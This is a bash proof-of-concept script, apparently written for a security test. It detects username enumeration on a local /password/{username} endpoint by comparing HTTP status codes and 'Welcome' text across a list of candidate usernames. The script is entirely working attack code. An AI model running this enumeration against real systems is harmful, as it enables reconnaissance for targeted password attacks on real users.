#!/bin/bash

# POC: Username Enumeration via Password Page Response Discrepancy
# Target: /password/{username} endpoint
# Vulnerability: Different HTTP responses for valid vs invalid usernames

TARGET="http://localhost:8082"
echo "============================================"
echo "Username Enumeration POC"
echo "Target: $TARGET/password/{username}"
echo "============================================"
echo ""

# Test usernames - mix of likely valid and invalid
TEST_USERNAMES=("test" "admin" "alice" "bob" "charlie" "root" "user" "john")

echo "[*] Testing username enumeration..."
echo ""

VALID_USERS=()
INVALID_USERS=()

for username in "${TEST_USERNAMES[@]}"; do
    # Get HTTP status code and check for redirect
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/password/$username")
    
    # Also check if response contains "Welcome" message (indicator of valid user)
    RESPONSE=$(curl -s "$TARGET/password/$username")
    
    if [ "$HTTP_CODE" = "200" ] && echo "$RESPONSE" | grep -q "Welcome"; then
        echo "[+] VALID username found: '$username' (HTTP $HTTP_CODE, contains 'Welcome' message)"
        VALID_USERS+=("$username")
    elif [ "$HTTP_CODE" = "302" ]; then
        echo "[-] Invalid username: '$username' (HTTP $HTTP_CODE, redirects to error)"
        INVALID_USERS+=("$username")
    else
        echo "[?] Unknown response for '$username' (HTTP $HTTP_CODE)"
    fi
done

echo ""
echo "============================================"
echo "RESULTS:"
echo "============================================"
echo "Valid usernames discovered: ${#VALID_USERS[@]}"
for user in "${VALID_USERS[@]}"; do
    echo "  - $user"
done
echo ""
echo "Invalid usernames tested: ${#INVALID_USERS[@]}"
echo ""

if [ ${#VALID_USERS[@]} -gt 0 ]; then
    echo "[!] VULNERABILITY CONFIRMED: Username enumeration possible"
    echo "[!] Attacker can distinguish valid from invalid usernames"
    echo "[!] This enables targeted password attacks and user reconnaissance"
    exit 0
else
    echo "[*] No valid usernames found in test set"
    exit 1
fi